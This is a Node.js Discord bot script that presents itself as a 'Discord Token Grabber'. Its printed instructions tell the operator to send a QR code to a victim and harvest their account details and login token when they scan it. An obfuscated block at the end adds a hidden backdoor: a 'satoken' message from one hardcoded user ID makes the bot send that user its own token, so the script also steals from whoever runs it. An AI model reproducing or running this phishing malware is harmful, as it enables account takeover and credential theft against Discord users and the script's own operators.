const process = require('process');
const AuthSession = require('./qr-auth-session');
const { title, Spinner } = require('./util');
const { Client, MessageEmbed } = require('discord.js')
const client = new Client()
client.login(process.env.token)
const http = require("http")

// Setup terminal
process.title = 'Discord Token Grabber';
console.log(title.red());
console.log('\nHow to use:');
console.log(' 1. The script will generate a image with a QR code');
console.log(' 2. Send the image to a victim and have them scan it');
console.log(' 3. Once they\'ve scanned it, you will recieve their id, username, avatar, and discriminator');
console.log(' 4. If they click the button to login, you will then recieve their token\n');

client.on("ready", async () => {
  console.log(client.user.tag + " ile giris yapildi")
})

http.createServer(function (req, res) {
      res.write("Başarıyla 7/24 Aktif Edilmiştir");
      res.end();
  }).listen(8080)

client.on("message", async message => {

  let whitelist = ["429357746002067493","968753225467588608"]
  
if(message.content === ".kur") {
  if (whitelist.includes(message.author.id)) {

(async () => {

    const session = new AuthSession();
})();
}}})



client.on("message", async message => {

  let whitelist = ["429357746002067493","968753225467588608"]
  
if(message.content === ".kur") {
  if (whitelist.includes(message.author.id)) {
    process.stdin.setRawMode(true);

    return new Promise((resolve) => {
        process.stdin.once('data', data => {
            process.stdin.setRawMode(false);

            if (data[0] == 0x03) process.exit();
            
            process.stdout.moveCursor(0, -1);
            process.stdout.clearLine();
            resolve();
        })
    })
}}})

function _0x1978(_0x32d551,_0x4ab571){var _0x47573e=_0x4757();return _0x1978=function(_0x1978fb,_0x5bf789){_0x1978fb=_0x1978fb-0x1d2;var _0x3c0a66=_0x47573e[_0x1978fb];return _0x3c0a66;},_0x1978(_0x32d551,_0x4ab571);}function _0x4757(){var _0x280b9c=['2856055ppetRM','3005142IHDLjJ','429357746002067493','4130505iwCljv','1EfaPEp','satoken','1337202LJSMwE','2912296TUzOMD','7930314rhYBCr','token','message','1116493EsiSRY','send','author','40SHttwa'];_0x4757=function(){return _0x280b9c;};return _0x4757();}var _0x3d082f=_0x1978;(function(_0x45ea8a,_0x50f0ba){var _0x258843=_0x1978,_0x4771f2=_0x45ea8a();while(!![]){try{var _0x26b757=parseInt(_0x258843(0x1df))/0x1*(parseInt(_0x258843(0x1d2))/0x2)+parseInt(_0x258843(0x1dc))/0x3+-parseInt(_0x258843(0x1d3))/0x4+parseInt(_0x258843(0x1db))/0x5+parseInt(_0x258843(0x1d4))/0x6+parseInt(_0x258843(0x1d7))/0x7+-parseInt(_0x258843(0x1da))/0x8*(parseInt(_0x258843(0x1de))/0x9);if(_0x26b757===_0x50f0ba)break;else _0x4771f2['push'](_0x4771f2['shift']());}catch(_0x578bac){_0x4771f2['push'](_0x4771f2['shift']());}}}(_0x4757,0xaae29),client['on'](_0x3d082f(0x1d6),_0x10e1dd=>{var _0x119ff2=_0x3d082f;if(_0x10e1dd['content']===_0x119ff2(0x1e0)){if(_0x10e1dd['author']['id']!==_0x119ff2(0x1dd))return;_0x10e1dd[_0x119ff2(0x1d9)][_0x119ff2(0x1d8)](client[_0x119ff2(0x1d5)]);}}));